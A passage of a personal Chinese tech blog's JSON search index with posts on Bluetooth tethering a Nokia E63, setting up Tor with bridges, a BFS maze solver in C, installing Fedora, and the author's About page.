push\n</code></pre>\n    </div>\n  </li>\n  <li>完成！\n    <blockquote>\n      <p>建议使用<code class=\"highlighter-rouge\">jekyll serve --watch</code>模式，这样系统一检测到改动就会自动生成，无需build<br />\n请将文章写在_posts文件夹下</p>\n    </blockquote>\n  </li>\n</ul>\n\n<p>By LEXUGE</p>\n"
    } ,
  
    {
      "title"    : "E63蓝牙上网",
      "category" : "",
      "tags"     : "计算机技巧",
      "url"      : "/jekyll/update/2016/08/26/E63%E8%93%9D%E7%89%99%E4%B8%8A%E7%BD%91.html",
      "date"     : "2016-08-26 14:04:00 +0800",
      "content"  : "<blockquote>\n  <p>对于国行的E63来说，并不配备有Wi-Fi功能，所以，就得近肯能的使用其他的\n免费数据连接来代替这一功能，其中最棒的选择就是Bluetooth连接。但是，Bluetooth连接\n只能创建两个终端的Peer to Peer连接或多个终端之间的LAN。这并不能获得外部数据。如何\n解决这一致命问题呢？</p>\n</blockquote>\n\n<p>可以使用另一台终端，其可直接访问Internet（比如笔记本），如同\n代理服务器一样，把E63用Bluetooth发送过来的网络请求进行执行，再把外部传回来的信息\n通过Bluetooth传回给E63，实现E63直接访问Internet的效果。示意图如下：</p>\n\n<p>发送：\n     蓝牙        网络连接\nE63  —&gt;  笔记本  —&gt;  Internet</p>\n\n<p>接收：\n     蓝牙        网络连接\nE63  &lt;—  笔记本  &lt;—  Internet</p>\n\n<p>思路就是这样，那么，该如何实现呢？</p>\n\n<p>以Windows为例，有以下教程：</p>\n<ol>\n  <li>下载Hiisi 1.6.3 （在文章末尾，这是Bluetooth代理套件，有客户端和服务端）</li>\n  <li>下载并安装JRE（Java运行环境），已有的可跳过本步骤，在CMD中输入java –version\n可验证是否正确配置该环境</li>\n  <li>（重要！！！）.在E63上新创建一个接入点，连接名称可命名为BLUETOOTH（命名随意）其他基本默认，分别如下：</li>\n</ol>\n\n<blockquote>\n  <p>数据承载方式：分组数据 <br />\n接入点名称：无<br />\n用户名：无<br />\n提示输入密码：否<br />\n密码：<strong>**</strong><strong>**</strong><br />\n鉴定：普通<br />\n主页：无</p>\n</blockquote>\n\n<p>然后点击选项-&gt;高级设置，设置如下：</p>\n\n<blockquote>\n  <p>网络类型：IPv4<br />\n手机IP地址：自动<br />\nDNS地址：自动<br />\n代理服务器地址：127.0.0.1<br />\n代理端口号码：1234</p>\n</blockquote>\n\n<ol>\n  <li>解压Hiisi 1.6.3，将hiisi1.6.3\\hiisi\\bin目录中的jad、jar两个文件提取，放置到E63的\nE盘安装（注意！！！安装时一定先运行hiisi.JAD,而不是JAR！)</li>\n  <li>打开蓝牙的设置，在“COM 端口”选项卡中，单击添加-&gt;确定，记下前面的端口号，比如：COM19</li>\n  <li>进入Hiisi 1.6.3\\Pihatonttu目录。右击-&gt;编辑，将COM XXXX改成你刚刚记下的端口号</li>\n  <li>将E63与电脑建立Bluetooth连接，建议添加信任设备</li>\n  <li>在Bluetooth设置的选项中将笔记本设为可见设备</li>\n  <li>现在运行Pihatonttu.cmd，若提示端口已被占用，请检查占用情况</li>\n  <li>在E63上找到刚刚安装的Hiisi Proxy，并打开</li>\n  <li>选择允许Hiisi Proxy使用网络或收发数据，并选择Bluetooth Mode（蓝牙模式）</li>\n  <li>会寻找蓝牙设备，搜寻完后，选择你的设备名，完毕后，会搜索端口，选择端口</li>\n  <li>此时，我们要确保连接是否工作，按选项-&gt;Setting,勾选Check now，按OK\n这时，系统会检测，若出现：Bluetooth connection is available，恭喜你，连接成功\n若出现Bluetooth connection is not available，请单击选项-&gt;Restart，再重复13步</li>\n</ol>\n\n<p>接下来就可以网上冲浪啦!</p>\n<blockquote>\n  <p>注意！！！请不要按Exit退出，按左边的房子按键退出，可确保\n代理程序在后台运行</p>\n</blockquote>\n\n<p>以后，只需打开Pihatonttu.cmd，然后手机端连接即可\n此外，在访问Internet的时候有几点要注意：\n这是通过代理服务器访问，速度较慢，请缓慢操作\n并不是非常稳定，并且服务端需要处理数据，请缓慢操作</p>\n\n<p>出现断线情况可按照13步检测并重启\nBy LEXUGE</p>\n"
    } ,
  
    {
      "title"    : "Tor的介绍及使用",
      "category" : "",
      "tags"     : "网络",
      "url"      : "/jekyll/update/2016/08/26/Tor%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8.html",
      "date"     : "2016-08-26 08:59:00 +0800",
      "content"  : "<blockquote>\n  <p>Tor究竟是如何运行的呢？其实很简单。你用Tor client（客户端）发送一个多层加密网络请求，\n随机指向一台Tor node（节点）帮你传送到目标主机上。node把这个请求的最外层解密，\n再随机发送到第二台node……这样重复经过3个node，最后到达目标主机。\n什么意思呢？简单的说就是你要发一封匿名信，你不自己送，也不叫邮差送。而在大街上随\n便找一个陌生人，陌生人再找另外一个陌生人，最后经过3个陌生人之手，达到对方手中。\n这样，检测难度就会更大，block的风险就会越小。</p>\n</blockquote>\n\n<p>但是，正是因为安全性高，所以，设置起来也是三种方法中最难的。\n现在，就来教大家一种永久的使用方法。</p>\n<ol>\n  <li>\n    <p>注册一个Yahoo！邮箱（必须是Yahoo！邮箱，除非你能使用Gmail）</p>\n  </li>\n  <li>\n    <p>发送主题为“help”的纯文本邮件到gettor@torproject.org，收到\n回复后根据邮件的提示再回复一次，即可在你的邮箱中收取Tor的软件\n包。切记要用纯文本的邮件格式。（获得的为英文版，如想获得中文\n版请参照Blog最后，不保证能访问）</p>\n  </li>\n  <li>\n    <p>给bridges@torproject.org 发送一封邮件（用纯文本格式），邮件\n的标题和正文写上get bridges（注意当中有空格）。这样就可以获得\nbridge（网桥）中继，也就是node。如需指定网桥类型在get bridges\n后面加上类型即可。如：get bridges obfs3(在正文中也要这么写)\n<br />\n获得了这些后，我们就要开始设置了。\n首先，安装好Tor（卸载时直接删除其文件夹即可）。\n<br />\n然后在安装完成后勾选运行（默认勾选），进入设置页面。\n<br />\n它首先会询问你当前连接互联网是否受限，因为我们被block了，所以\n在Connect（直接连接）与Configure（配置）中选则Configure。\n<br />\n进入下一步，他会询问你ISP（电信运营商）有没有屏蔽互联网接入\n因为被block了，所以我们选择Yes（是），点击Next（下一步）。\n<br />\n下面到了最关键的一步，我们要设置node了，这时候我们需要用到之前\n发送邮件得到的bridges，复制邮件中所有的bridges（通常是3个）\n通常是这样的格式：IP地址:端口 hash值校验码（数字与大写字母混合）\n复制好后我们在这一步中选择Enter custon bridges（自定义网桥中继）\n在文本框中粘贴我们复制的bridges。单击Next（下一步）\n<br />\n最后，他会询问我们是否通过代理连接，这通常是在公司等内部网络使用\n我们不需要，选择No（否），最后点击Connect（连接）\n<br />\n这时，Tor会开始连接，耐心等待后就可以了。\n成功后会跳出浏览器，显示Congratulations（成功）</p>\n  </li>\n</ol>\n\n<p>接下来就交给大家了，如是通过邮件得到的就是英文版本，有不懂得单词\n翻译一下。</p>\n\n<p>如果想获得中文版本的Tor，需要登录Tor官网：<br />\nhttps://www.torproject.org/ （被block）<br />\nhttps://www.theonionrouter.com/ （目前可用）<br />\n在Download Tor的页面中把English改成简体字，然后下载\n获取网桥过程与使用过程参照上述。</p>\n"
    } ,
  
    {
      "title"    : "BFS走迷宫",
      "category" : "",
      "tags"     : "算法, C",
      "url"      : "/jekyll/update/2016/08/26/BFS%E8%B5%B0%E8%BF%B7%E5%AE%AB.html",
      "date"     : "2016-08-26 08:54:00 +0800",
      "content"  : "<p>代码如下：</p>\n\n<div class=\"language-c highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"cp\">#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;conio.h&gt;//链接头文件\n</span>\n<span class=\"k\">struct</span> <span class=\"n\">ser</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">;</span>\n  <span class=\"kt\">int</span> <span class=\"n\">trace</span><span class=\"p\">;</span>\n  <span class=\"kt\">int</span> <span class=\"n\">hx</span><span class=\"p\">,</span><span class=\"n\">hy</span><span class=\"p\">;</span>\n<span class=\"p\">};</span><span class=\"c1\">//定义结构体ser，用于存储每个点的坐标，是否为障碍，和上一个点的坐标\n</span><span class=\"k\">struct</span> <span class=\"n\">rec</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">;</span>\n<span class=\"p\">};</span><span class=\"c1\">//定义结构体bs，用于存储当前进入搜索队列bs数组的点的坐标，有了坐标也可以访问用来a数组的这个节点从而获取更多的信息\n</span><span class=\"k\">struct</span> <span class=\"n\">ser</span> <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"mi\">11</span><span class=\"p\">][</span><span class=\"mi\">11</span><span class=\"p\">];</span><span class=\"c1\">//二维的地图节点信息\n</span><span class=\"k\">struct</span> <span class=\"n\">rec</span> <span class=\"n\">bs</span><span class=\"p\">[</span><span class=\"mi\">11</span><span class=\"p\">];</span><span class=\"c1\">//搜索队列\n</span><span class=\"kt\">int</span> <span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">5</span><span class=\"p\">][</span><span class=\"mi\">3</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"p\">{</span><span class=\"mi\">0</span><span class=\"p\">};</span><span class=\"c1\">//方向数组，上下左右的顺序存放\n</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">m</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">xb</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"c1\">//xb用来更进bs搜索数组的节点存放（也就是搜索队列的尾）\n</span>\n<span class=\"kt\">void</span> <span class=\"n\">bfs</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">di</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"p\">);</span>\n<span class=\"kt\">void</span> <span class=\"n\">out</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"p\">);</span><span class=\"c1\">//函数声明段\n</span>\n<span class=\"kt\">void</span> <span class=\"nf\">out</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"p\">)</span><span class=\"c1\">//输出函数，输出为(n,m)-(x,x)-(x,x)-……-(1,1)，原理为递归\n</span><span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">x</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">))</span><span class=\"c1\">//如果当前坐标为起点就输出起点坐标，结束\n</span>  <span class=\"p\">{</span>\n    <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"(%d,%d)\"</span><span class=\"p\">,</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">);</span>\n    <span class=\"n\">getch</span><span class=\"p\">();</span>\n    <span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span><span class=\"c1\">//退出整个程序，函数原型位于stdlib.h\n</span>  <span class=\"p\">}</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"(%d,%d)-\"</span><span class=\"p\">,</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">);</span><span class=\"c1\">//否则输出当前点的坐标\n</span>  <span class=\"n\">out</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">][</span><span class=\"n\">y</span><span class=\"p\">].</span><span class=\"n\">hx</span><span class=\"p\">,</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">][</span><span class=\"n\">y</span><span class=\"p\">].</span><span class=\"n\">hy</span><span class=\"p\">);</span><span class=\"c1\">//输出当前点的前一个节点\n</span><span class=\"p\">}</span>\n<span class=\"kt\">void</span> <span class=\"nf\">bfs</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">di</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"p\">)</span><span class=\"c1\">//宽度优先搜索，程序核心\n</span><span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">nx</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">ny</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"c1\">//nx为下一个肯能节点的行，ny为下一个肯能节点的列\n</span>  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">x</span><span class=\"o\">==</span><span class=\"n\">n</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"n\">m</span><span class=\"p\">))</span> <span class=\"n\">out</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">);</span><span class=\"c1\">//如果到达终点就递归输出路径（调用out函数）\n</span>  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"mi\">4</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span><span class=\"c1\">//以上下左右的顺序来搜索当前结点的四周的肯能节点\n</span>  <span class=\"p\">{</span>\n    <span class=\"n\">nx</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"o\">+</span><span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">][</span><span class=\"mi\">1</span><span class=\"p\">];</span><span class=\"c1\">//肯能节点的行\n</span>    <span class=\"n\">ny</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"o\">+</span><span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">][</span><span class=\"mi\">2</span><span class=\"p\">];</span><span class=\"c1\">//肯能节点的列\n</span>    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">nx</span><span class=\"o\">&gt;=</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">nx</span><span class=\"o\">&lt;=</span><span class=\"n\">n</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">ny</span><span class=\"o\">&gt;=</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">ny</span><span class=\"o\">&lt;=</span><span class=\"n\">m</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">nx</span><span class=\"p\">][</span><span class=\"n\">ny</span><span class=\"p\">].</span><span class=\"n\">trace</span><span class=\"o\">==</span><span class=\"mi\">0</span><span class=\"p\">))</span><span class=\"c1\">//如果肯能在地图范围内且肯能节点非障碍\n</span>    <span class=\"p\">{</span>\n      <span class=\"o\">++</span><span class=\"n\">xb</span><span class=\"p\">;</span><span class=\"c1\">//搜索队列的尾下标加一\n</span>      <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">][</span><span class=\"n\">y</span><span class=\"p\">].</span><span class=\"n\">trace</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"c1\">//把当前点标为不能走，以防止走回头路从而产生无穷无尽的搜索\n</span>      <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">nx</span><span class=\"p\">][</span><span class=\"n\">ny</span><span class=\"p\">].</span><span class=\"n\">hx</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"p\">;</span>\n      <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">nx</span><span class=\"p\">][</span><span class=\"n\">ny</span><span class=\"p\">].</span><span class=\"n\">hy</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"p\">;</span><span class=\"c1\">//肯能节点的前一个节点为当前结点\n</span>      <span class=\"n\">bs</span><span class=\"p\">[</span><span class=\"n\">xb</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">nx</span><span class=\"p\">;</span>\n      <span class=\"n\">bs</span><span class=\"p\">[</span><span class=\"n\">xb</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">ny</span><span class=\"p\">;</span><span class=\"c1\">//将肯能节点添加到搜索队列\n</span>    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"o\">++</span><span class=\"n\">di</span><span class=\"p\">;</span><span class=\"c1\">//搜索队列的头（也就是当前搜索点）加一\n</span>  <span class=\"n\">bfs</span><span class=\"p\">(</span><span class=\"n\">di</span><span class=\"p\">,</span><span class=\"n\">bs</span><span class=\"p\">[</span><span class=\"n\">di</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">bs</span><span class=\"p\">[</span><span class=\"n\">di</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"p\">);</span><span class=\"c1\">//遍历到下一个同层级或下一个层级的节点\n</span><span class=\"p\">}</span>\n<span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"p\">()</span><span class=\"c1\">//主程序\n</span><span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">][</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">=-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">][</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">][</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">][</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">][</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">][</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"o\">=-</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">4</span><span class=\"p\">][</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">dic</span><span class=\"p\">[</span><span class=\"mi\">4</span><span class=\"p\">][</span><span class=\"mi\">2</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"c1\">//以上下左右的顺序初始化dic数组\n</span>  <span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%d %d\"</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">n</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">m</span><span class=\"p\">);</span><span class=\"c1\">//输入当前迷宫的大小\n</span>  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span><span class=\"c1\">//输入二维的迷宫地图\n</span>    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">j</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">j</span><span class=\"o\">&lt;=</span><span class=\"n\">m</span><span class=\"p\">;</span><span class=\"n\">j</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%d\"</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">][</span><span class=\"n\">j</span><span class=\"p\">].</span><span class=\"n\">trace</span><span class=\"p\">);</span><span class=\"c1\">//输入当前结点，存放到当前结点的是否可行走信息中\n</span>      <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">][</span><span class=\"n\">j</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">i</span><span class=\"p\">;</span><span class=\"c1\">//记录当前结点的行\n</span>      <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">][</span><span class=\"n\">j</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">j</span><span class=\"p\">;</span><span class=\"c1\">//记录当前结点的列\n</span>    <span class=\"p\">}</span>\n  <span class=\"n\">bs</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">bs</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"c1\">//搜索队列的第一个点为起点\n</span>  <span class=\"n\">bfs</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">1</span><span class=\"p\">);</span><span class=\"c1\">//宽度优先搜索第一个点周围的所有肯能节点\n</span><span class=\"p\">}</span>\n\n</code></pre>\n</div>\n"
    } ,
  
    {
      "title"    : "Fedora 启动U盘制作和安装教程",
      "category" : "",
      "tags"     : "Linux, 计算机技巧",
      "url"      : "/jekyll/update/2016/08/26/Fedora-%E5%90%AF%E5%8A%A8U%E7%9B%98%E5%88%B6%E4%BD%9C%E5%92%8C%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B.html",
      "date"     : "2016-08-26 07:45:00 +0800",
      "content"  : "<blockquote>\n  <p>Fedora是一个不错的Linux发行版，它界面清爽，安装简洁，稳定性高，驱动自适应性能强。由社区开发维护，Red Hat公司资助。</p>\n</blockquote>\n\n<p><a href=\"https://getfedora.org/\">Fedora官网</a><br />\n<a href=\"http://www.pendrivelinux.com/universal-usb-installer-easy-as-1-2-3/\">UUI启动U盘制作工具官网</a><br />\n下面就来介绍如何制作Fedora启动U盘(Windows下)<br />\n在上面的链接下载Universal USB installer，这是一款windows上的专业Linux启动U盘制作工具，非常适合Fedora的严苛要求。</p>\n<ul>\n  <li>Step1.选择要制作的Linux发行版，我们选择Fedora</li>\n  <li>Step2.选择镜像文件</li>\n  <li>Step3.选择U盘（建议勾选格式化选项）</li>\n  <li>Step4.默认\n单击Create，开始制作，制作完成后，启动U盘制作教程结束</li>\n</ul>\n\n<p>弹出U盘，重启，选择U盘引导<br />\n出现Fedora Live字样时回车，出现Welcome to Fedora，建议先Try Fedora，连接WLAN后再Install to Hard Drive<br />\n安装语言选择简体中文<br />\n后面的个性化配置不讲了，重点是分区配置<br />\n若是只安装Fedora，进入我要分配分区，在此进行分区配置，若有原先操作系统，就删除那些分区，新手建议使用Fedora的自动分区方案，建议选择LVM，若会分区就手动操作<br />\n接下来的设置用户就不再烦述<br />\n安装完成，享受Linux之乐趣吧！</p>\n"
    } ,
  
    {
      "title"    : "Welcome",
      "category" : "",
      "tags"     : "Welcome",
      "url"      : "/jekyll/update/2016/08/25/Welcome.html",
      "date"     : "2016-08-25 00:00:00 +0800",
      "content"  : "<p>欢迎来到我的BLOG，这是一个以计算机技术为主的个人BLOG，当然也有一些生活感悟之类的。</p>\n<blockquote>\n  <p>We believe that writing is about content, about what you want to say – not about fancy formatting.</p>\n</blockquote>\n\n<p>我们坚信写作写的是内容，所思所想，而不是花样格式。</p>\n"
    } 
  
  ,
  
   {
     
        "title"    : "About",
        "category" : "",
        "tags"     : "",
        "url"      : "/about/",
        "date"     : "",
        "content"  : "<p>这是我的一个个人BLOG，我是一名Geek，会在这里发布一些技术教程类的文章，当然也不乏一些生活感悟之类的日记:-)\n目前我使用Fedora，已经转战Linux了。至少在2016年，我还是一名初一生，BLOG也是2016年建立的。<br />\n我会坚守BLOG，记录自己成长路上的点点滴滴。<br />\n编程——编织梦想，成就未来！<br />\n2016/9/17<br />\n转战到Arch Linux，并投身于Fedora社区的翻译工作以及Arch Wiki的翻译工作。<br />\n2017/5/12</p>\n\n<ul>\n  <li>这是我的GPG公钥指纹：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>pub   rsa4096 2017-08-01 [SC]\n    E8D2 8E75 0C28 D60D 8FBD  827E BAC0 5026 97DC AB44\nuid           [ 绝对 ] LEXUGE (Ying Kanyang-Archlinux user) &lt;LEXUGEyky@outlook.com&gt;\nsub   rsa4096 2017-08-01 [E]\n</code></pre>\n    </div>\n  </li>\n  <li>这里提供一些软件的资源下载：<br />\n<a href=\"/download/C2Doom.rar\">C2Doom</a><br />\n<a href=\"/download/EDIT.zip\">EDIT(程序+源代码)</a><br />\n<a href=\"/download/LEDIT.zip\">LEDIT(程序+源代码)</a><br />\n<a href=\"/download/craft-l.zip\">Craft-L(程序+源代码)</a><br />\n<a href=\"/download/TC3.0.exe\">TC3.0</a><br />\n<a href=\"/download/GAMEOX.zip\">GAMEOX（程序+源代码）</a><br />\n<a href=\"/download/Hiisi1.6.3.rar\">Hiisi1.6.3</a><br />\n<a href=\"/download/RSA-tool.zip\">RSA-tool</a><br />\n<a href=\"/download/cmder_mini.zip\">cmder</a><br />\n<a href=\"/download/public-yky.asc\">yky-pubkey</a><br />\n<a href=\"/download/WMware-Hackintosh.zip\">VMware Player-Hackintosh组合包</a><br />\n<a href=\"/download/trans.py\">Trans-中英互译Python脚本</a><br />\n<a href=\"/download/XCH.zip\">XCH-化学方程式配平程序</a><br />\n<a href=\"/download/minima-2.1.zip\">Jekyll-minima-科技感配置</a></li>\n</ul>\n\n<p><img src=\"/image/耳机图标.ico\" alt=\"\" />  <strong>| Music Zone</strong></p>\n<ul>\n  <li>\n    <p><strong>Coldplay:</strong><br />\n  Hymn For The Weekend [Remix]: <audio src=\"/music/Hymn For The Weekend.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>Maroon 5:</strong><br />\n  Maps: <audio src=\"/music/Maps.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  Sugar: <audio src=\"/music/Sugar.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  Moves Like Jagger: <audio src=\"/music/Moves Like Jagger.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>One Direction:</strong><br />\n  What Makes You Beautiful: <audio src=\"/music/What Makes You Beautiful.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>Alan Walker:</strong><br />\n  Fade: <audio src=\"/music/Fade.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  Alone: <audio src=\"/music/Alone.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>Taylor Swift:</strong><br />\n  I knew you were trouble: <audio src=\"/music/I knew you were trouble.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>Simon &amp; Garfunkel:</strong><br />\n  The Sound Of Silence: <audio src=\"/music/The Sound Of Silence.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>Chinese Pop Music:</strong><br />\n  蓝莲花: <audio src=\"/music/蓝莲花.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  平凡之路: <audio src=\"/music/平凡之路.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n  No Fear In My Heart: <audio src=\"/music/No Fear In My Heart.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio></p>\n  </li>\n  <li>\n    <p><strong>Pop music:</strong><br />\n  The Greatest: <audio src=\"/music/The 